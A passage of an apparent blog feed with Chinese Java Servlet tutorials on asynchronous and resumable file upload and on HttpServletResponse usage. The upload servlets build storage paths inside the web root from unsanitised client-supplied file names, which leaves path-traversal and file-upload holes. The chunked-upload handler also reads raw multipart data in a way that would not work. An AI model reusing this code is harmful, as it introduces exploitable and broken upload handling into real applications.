class="string">&#x27;upload&#x27;</span>, <span class="literal">true</span>);</span></span><br><span class="line"><span class="language-javascript">    xhr.<span class="title function_">send</span>(formData);</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h3 id="4-2-使用多线程处理上传的文件"><a href="#4-2-使用多线程处理上传的文件" class="headerlink" title="4.2 使用多线程处理上传的文件"></a>4.2 使用多线程处理上传的文件</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@WebServlet(&quot;/upload-async&quot;)</span></span><br><span class="line"><span class="meta">@MultipartConfig</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AsyncUploadServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">ExecutorService</span> <span class="variable">executorService</span> <span class="operator">=</span> Executors.newFixedThreadPool(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span></span><br><span class="line">            <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">final</span> <span class="type">Part</span> <span class="variable">filePart</span> <span class="operator">=</span> request.getPart(<span class="string">&quot;file&quot;</span>);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> getFileName(filePart);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">uploadPath</span> <span class="operator">=</span> getServletContext().getRealPath(<span class="string">&quot;&quot;</span>) + File.separator + <span class="string">&quot;uploads&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 创建存储目录</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">uploadDir</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(uploadPath);</span><br><span class="line">        <span class="keyword">if</span> (!uploadDir.exists()) &#123;</span><br><span class="line">            uploadDir.mkdir();</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 异步处理文件</span></span><br><span class="line">        executorService.submit(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                filePart.write(uploadPath + File.separator + fileName);</span><br><span class="line">                </span><br><span class="line">                <span class="comment">// 这里可以进行额外的文件处理，如图片压缩、水印添加等</span></span><br><span class="line">                processFile(uploadPath + File.separator + fileName);</span><br><span class="line">                </span><br><span class="line">                System.out.println(<span class="string">&quot;文件 &quot;</span> + fileName + <span class="string">&quot; 处理完成&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 立即返回响应</span></span><br><span class="line">        response.setContentType(<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line">        response.getWriter().println(<span class="string">&quot;文件上传中，请稍后...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_">getFileName</span><span class="params">(Part part)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">contentDisp</span> <span class="operator">=</span> part.getHeader(<span class="string">&quot;content-disposition&quot;</span>);</span><br><span class="line">        String[] tokens = contentDisp.split(<span class="string">&quot;;&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (String token : tokens) &#123;</span><br><span class="line">            <span class="keyword">if</span> (token.trim().startsWith(<span class="string">&quot;filename&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> token.substring(token.indexOf(<span class="string">&#x27;=&#x27;</span>) + <span class="number">1</span>).trim().replace(<span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">processFile</span><span class="params">(String filePath)</span> &#123;</span><br><span class="line">        <span class="comment">// 实现文件处理逻辑</span></span><br><span class="line">        <span class="comment">// 例如：图片压缩、格式转换等</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 关闭线程池</span></span><br><span class="line">        executorService.shutdown();</span><br><span class="line">        <span class="built_in">super</span>.destroy();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="4-3-断点续传实现"><a href="#4-3-断点续传实现" class="headerlink" title="4.3 断点续传实现"></a>4.3 断点续传实现</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@WebServlet(&quot;/resume-upload&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ResumeUploadServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span></span><br><span class="line">            <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="comment">// 返回断点续传上传页面</span></span><br><span class="line">        response.setContentType(<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">        </span><br><span class="line">        out.println(<span class="string">&quot;&lt;!DOCTYPE html&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;html&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;head&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;title&gt;断点续传示例&lt;/title&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;script&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;function uploadChunk(file, start, chunkSize) &#123;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;  let end = Math.min(start + chunkSize, file.size);&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;  let chunk = file.slice(start, end);&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;  let xhr = new XMLHttpRequest();&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;  let formData = new FormData();&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;  formData.append(&#x27;file&#x27;, chunk);&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;  formData.append(&#x27;fileName&#x27;, file.name);&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;  formData.append(&#x27;start&#x27;, start);&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;  formData.append(&#x27;end&#x27;, end);&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;  formData.append(&#x27;fileSize&#x27;, file.size);&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;  xhr.open(&#x27;POST&#x27;, &#x27;resume-upload&#x27;, true);&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;  xhr.onload = function() &#123;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;    if (xhr.status === 200) &#123;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;      if (end &lt; file.size) &#123;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;        uploadChunk(file, end, chunkSize);&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;      &#125; else &#123;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;        alert(&#x27;上传完成&#x27;);&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;      &#125;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;    &#125;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;  &#125;;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;  xhr.send(formData);&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;function startUpload() &#123;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;  let file = document.getElementById(&#x27;fileInput&#x27;).files[0];&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;  if (file) &#123;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;    // 每次上传1MB&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;    uploadChunk(file, 0, 1024 * 1024);&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;  &#125;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;/script&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;/head&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;body&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;h2&gt;断点续传示例&lt;/h2&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;input type=&#x27;file&#x27; id=&#x27;fileInput&#x27;&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;button onclick=&#x27;startUpload()&#x27;&gt;开始上传&lt;/button&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;/body&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;/html&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span></span><br><span class="line">            <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="comment">// 接收文件块</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;fileName&quot;</span>);</span><br><span class="line">        <span class="type">long</span> <span class="variable">start</span> <span class="operator">=</span> Long.parseLong(request.getParameter(<span class="string">&quot;start&quot;</span>));</span><br><span class="line">        <span class="type">long</span> <span class="variable">end</span> <span class="operator">=</span> Long.parseLong(request.getParameter(<span class="string">&quot;end&quot;</span>));</span><br><span class="line">        <span class="type">long</span> <span class="variable">fileSize</span> <span class="operator">=</span> Long.parseLong(request.getParameter(<span class="string">&quot;fileSize&quot;</span>));</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 获取上传文件存储目录</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">uploadPath</span> <span class="operator">=</span> getServletContext().getRealPath(<span class="string">&quot;&quot;</span>) + File.separator + <span class="string">&quot;uploads&quot;</span>;</span><br><span class="line">        <span class="type">File</span> <span class="variable">uploadDir</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(uploadPath);</span><br><span class="line">        <span class="keyword">if</span> (!uploadDir.exists()) &#123;</span><br><span class="line">            uploadDir.mkdir();</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 目标文件</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">targetFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(uploadPath, fileName);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 使用RandomAccessFile实现断点续传</span></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> request.getInputStream();</span><br><span class="line">             <span class="type">RandomAccessFile</span> <span class="variable">raf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RandomAccessFile</span>(targetFile, <span class="string">&quot;rw&quot;</span>)) &#123;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 定位到文件的写入位置</span></span><br><span class="line">            raf.seek(start);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 写入数据</span></span><br><span class="line">            <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">4096</span>];</span><br><span class="line">            <span class="type">int</span> bytesRead;</span><br><span class="line">            <span class="keyword">while</span> ((bytesRead = in.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                raf.write(buffer, <span class="number">0</span>, bytesRead);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            response.setStatus(HttpServletResponse.SC_OK);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="java" scheme="http://example.com/categories/java/"/>
    
    
    <category term="java" scheme="http://example.com/tags/java/"/>
    
    <category term="servlet" scheme="http://example.com/tags/servlet/"/>
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
    <category term="文件上传" scheme="http://example.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
    <category term="文件下载" scheme="http://example.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/"/>
    
  </entry>
  
  <entry>
    <title>HttpServletResponse详解</title>
    <link href="http://example.com/2025/04/03/java/servlet/HttpServletResponse/"/>
    <id>http://example.com/2025/04/03/java/servlet/HttpServletResponse/</id>
    <published>2025-04-03T20:00:00.000Z</published>
    <updated>2025-04-05T11:38:59.690Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="1-HttpServletResponse简介"><a href="#1-HttpServletResponse简介" class="headerlink" title="1. HttpServletResponse简介"></a>1. HttpServletResponse简介</h2><p>HttpServletResponse 接口用于封装服务器的响应信息。服务器会创建一个 HttpServletResponse 对象并将它作为参数传递给 Servlet 的 service 方法。</p><h2 id="2-常用功能"><a href="#2-常用功能" class="headerlink" title="2. 常用功能"></a>2. 常用功能</h2><h3 id="2-1-设置响应头"><a href="#2-1-设置响应头" class="headerlink" title="2.1 设置响应头"></a>2.1 设置响应头</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 设置单个响应头</span></span><br><span class="line">response.setHeader(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加响应头（允许多个同名头）</span></span><br><span class="line">response.addHeader(<span class="string">&quot;Set-Cookie&quot;</span>, <span class="string">&quot;name=value&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置日期类型的响应头</span></span><br><span class="line">response.setDateHeader(<span class="string">&quot;Expires&quot;</span>, <span class="keyword">new</span> <span class="title class_">Date</span>().getTime());</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置整数类型的响应头</span></span><br><span class="line">response.setIntHeader(<span class="string">&quot;Refresh&quot;</span>, <span class="number">5</span>);</span><br></pre></td></tr></table></figure></div><h3 id="2-2-设置响应状态"><a href="#2-2-设置响应状态" class="headerlink" title="2.2 设置响应状态"></a>2.2 设置响应状态</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 设置状态码</span></span><br><span class="line">response.setStatus(HttpServletResponse.SC_OK); <span class="comment">// 200</span></span><br><span class="line">response.setStatus(HttpServletResponse.SC_NOT_FOUND); <span class="comment">// 404</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 发送错误状态码和错误信息</span></span><br><span class="line">response.sendError(HttpServletResponse.SC_NOT_FOUND, <span class="string">&quot;资源未找到&quot;</span>);</span><br></pre></td></tr></table></figure></div><h3 id="2-3-设置响应内容"><a href="#2-3-设置响应内容" class="headerlink" title="2.3 设置响应内容"></a>2.3 设置响应内容</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 设置响应内容类型</span></span><br><span class="line">response.setContentType(<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置字符编码</span></span><br><span class="line">response.setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取响应输出流</span></span><br><span class="line"><span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">writer.println(<span class="string">&quot;&lt;html&gt;&lt;body&gt;&quot;</span>);</span><br><span class="line">writer.println(<span class="string">&quot;&lt;h1&gt;Hello World&lt;/h1&gt;&quot;</span>);</span><br><span class="line">writer.println(<span class="string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取字节输出流（用于二进制数据）</span></span><br><span class="line"><span class="type">ServletOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> response.getOutputStream();</span><br><span class="line">out.write(imageData);</span><br></pre></td></tr></table></figure></div><h3 id="2-4-重定向"><a href="#2-4-重定向" class="headerlink" title="2.4 重定向"></a>2.4 重定向</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 重定向到其他URL</span></span><br><span class="line">response.sendRedirect(<span class="string">&quot;/other-page.html&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 重定向到其他站点</span></span><br><span class="line">response.sendRedirect(<span class="string">&quot;https://www.example.com&quot;</span>);</span><br></pre></td></tr></table></figure></div><h2 id="3-实际应用示例"><a href="#3-实际应用示例" class="headerlink" title="3. 实际应用示例"></a>3. 实际应用示例</h2><h3 id="3-1-输出HTML页面"><a href="#3-1-输出HTML页面" class="headerlink" title="3.1 输出HTML页面"></a>3.1 输出HTML页面</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@WebServlet(&quot;/html&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HtmlServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> </span><br><span class="line">            <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        response.setContentType(<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">        </span><br><span class="line">        out.println(<span class="string">&quot;&lt;!DOCTYPE html&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;html&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;head&gt;&lt;title&gt;HTML响应示例&lt;/title&gt;&lt;/head&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;body&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;h1&gt;HTML响应示例&lt;/h1&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;p&gt;当前时间：&quot;</span> + <span class="keyword">new</span> <span class="title class_">Date</span>() + <span class="string">&quot;&lt;/p&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;/body&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;/html&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="3-2-输出JSON数据"><a href="#3-2-输出JSON数据" class="headerlink" title="3.2 输出JSON数据"></a>3.2 输出JSON数据</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@WebServlet(&quot;/json&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JsonServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> </span><br><span class="line">            <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        response.setContentType(<span class="string">&quot;application/json;charset=UTF-8&quot;</span>);</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">        </span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">json</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">        json.put(<span class="string">&quot;status&quot;</span>, <span class="string">&quot;success&quot;</span>);</span><br><span class="line">        json.put(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;操作成功&quot;</span>);</span><br><span class="line">        json.put(<span class="string">&quot;timestamp&quot;</span>, System.currentTimeMillis());</span><br><span class="line">        </span><br><span class="line">        out.println(json.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="3-3-文件下载"><a href="#3-3-文件下载" class="headerlink" title="3.3 文件下载"></a>3.3 文件下载</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@WebServlet(&quot;/download&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DownloadServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> </span><br><span class="line">            <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="comment">// 设置响应头</span></span><br><span class="line">        response.setContentType(<span class="string">&quot;application/octet-stream&quot;</span>);</span><br><span class="line">        response.setHeader(<span class="string">&quot;Content-Disposition&quot;</span>, </span><br><span class="line">            <span class="string">&quot;attachment;filename=test.txt&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 写入文件内容</span></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;test.txt&quot;</span>);</span><br><span class="line">             <span class="type">ServletOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> response.getOutputStream()) &#123;</span><br><span class="line">            <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">4096</span>];</span><br><span class="line">            <span class="type">int</span> length;</span><br><span class="line">            <span class="keyword">while</span> ((length = in.read(buffer)) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                out.write(buffer, <span class="number">0</span>, length);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="4-注意事项"><a href="#4-注意事项" class="headerlink" title="4. 注意事项"></a>4. 注意事项</h2><ol><li><p>响应头设置必须在响应体发送之前</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 正确的顺序</span></span><br><span class="line">response.setContentType(<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line"><span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">out.println(<span class="string">&quot;&lt;html&gt;...&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 错误的顺序</span></span><br><span class="line"><span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">out.println(<span class="string">&quot;&lt;html&gt;...&quot;</span>);</span><br><span class="line">response.setContentType(<span class="string">&quot;text/html;charset=UTF-8&quot;</span>); <span class="comment">// 无效</span></span><br></pre></td></tr></table></figure></div></li><li><p>避免重复写入响应</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 避免同时使用</span></span><br><span class="line"><span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line"><span class="type">ServletOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> response.getOutputStream();</span><br></pre></td></tr></table></figure></div></li><li><p>正确处理字符编码</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 建议的设置顺序</span></span><br><span class="line">response.setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">response.setContentType(<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br></pre></td></tr></table></figure></div></li><li><p>及时刷新和关闭流</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    out.println(<span class="string">&quot;数据&quot;</span>);</span><br><span class="line">    out.flush();</span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    out.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li></ol><h2 id="5-最佳实践"><a href="#5-最佳实践" class="headerlink" title="5. 最佳实践"></a>5. 最佳实践</h2><ol><li><p>合理使用响应缓存</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 设置缓存控制</span></span><br><span class="line">response.setHeader(<span class="string">&quot;Cache-Control&quot;</span>, <span class="string">&quot;no-cache, no-store, must-revalidate&quot;</span>);</span><br><span class="line">response.setHeader(<span class="string">&quot;Pragma&quot;</span>, <span class="string">&quot;no-cache&quot;</span>);</span><br><span class="line">response.setDateHeader(<span class="string">&quot;Expires&quot;</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure></div></li><li><p>正确处理错误情况</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 业务逻辑</span></span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    response.sendError(HttpServletResponse.SC_INTERNAL_SERVER_ERROR, </span><br><span class="line">        <span class="string">&quot;服务器内部错误&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li><li><p>使用适当的状态码</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 资源创建成功</span></span><br><span class="line">response.setStatus(HttpServletResponse.SC_CREATED);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 请求参数错误</span></span><br><span class="line">response.setStatus(HttpServletResponse.SC_BAD_REQUEST);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 未授权访问</span></span><br><span class="line">response.setStatus(HttpServletResponse.SC_UNAUTHORIZED);</span><br></pre></td></tr></table></figure></div></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="java" scheme="http://example.com/categories/java/"/>
    
    
    <category term="java" scheme="http://example.com/tags/java/"/>
    
    <category term="servlet" scheme="http://example.com/tags/servlet/"/>
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>ServletContext</title>
    <link href="http://example.com/2025/04/01/java/servlet/ServletContext/"/>
    <id>http://example.com/2025/04/01/java/servlet/ServletContext/</id>
    <published>2025-04-01T13:00:00.000Z</published>
    <updated>2025-04-05T11:38:59.690Z</updated>
    
